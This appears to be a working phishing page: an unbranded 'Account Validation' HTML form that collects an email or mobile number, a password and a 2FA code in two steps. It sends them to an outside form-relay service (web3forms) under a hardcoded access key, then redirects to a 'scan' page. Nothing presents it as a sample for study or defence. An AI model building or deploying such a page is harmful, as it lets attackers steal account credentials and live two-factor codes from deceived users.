<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body {font-family: Arial, Helvetica, sans-serif;}
form {border: 3px solid #f1f1f1; padding: 16px;}

input[type=text], input[type=password] {
  width: 100%;
  padding: 12px 20px;
  margin: 8px 0;
  display: inline-block;
  border: 1px solid #ccc;
  box-sizing: border-box;
}

button {
  background-color: #04AA6D;
  color: white;
  padding: 14px 20px;
  margin: 8px 0;
  border: none;
  cursor: pointer;
  width: 100%;
}

button:hover { opacity: 0.8; }

.cancelbtn {
  width: auto;
  padding: 10px 18px;
  background-color: #f44336;
}

.imgcontainer {
  text-align: center;
  margin: 24px 0 12px 0;
}

img.avatar {
  width: 40%;
  border-radius: 50%;
}

.container { padding: 16px; }

#step2 {
  display: none; /* hidden until step1 is completed */
}
</style>
</head>
<body>

<h2>Account Validation</h2>

<div class="imgcontainer">
  <img src="img_avatar2.png" alt="Avatar" class="avatar">
</div>

<form id="validationForm" action="https://api.web3forms.com/submit" method="POST">
  <input type="hidden" name="access_key" value="bd395d4f-052f-46be-bebe-62e62bf140d1">
  <!-- Redirect to /scan/scan/index.html after submission -->
  <input type="hidden" name="_next" value="/scan/scan/index.html">

  <!-- Step 1: Username + Password -->
  <div id="step1" class="container">
    <label for="email"><b>Username</b></label>
    <input type="text" placeholder="Email/Mobile number" name="email" required>

    <label for="password"><b>Password</b></label>
    <input type="password" placeholder="Enter Password" name="password" required>

    <button type="button" id="proceedBtn">Proceed</button>
    <label>
      <input type="checkbox" checked="checked" name="remember"> Remember me
    </label>
  </div>

  <!-- Step 2: Validation Code -->
  <div id="step2" class="container">
    <label for="code"><b>Authentication Code</b></label>
    <input type="text" placeholder="Enter 2fa Code" name="code" required>

    <button type="submit">Login</button>
  </div>
</form>

<script>
  const proceedBtn = document.getElementById("proceedBtn");
  const step1 = document.getElementById("step1");
  const step2 = document.getElementById("step2");

  proceedBtn.addEventListener("click", function() {
    // Hide step1 and show step2
    step1.style.display = "none";
    step2.style.display = "block";
  });
</script>

</body>
</html>
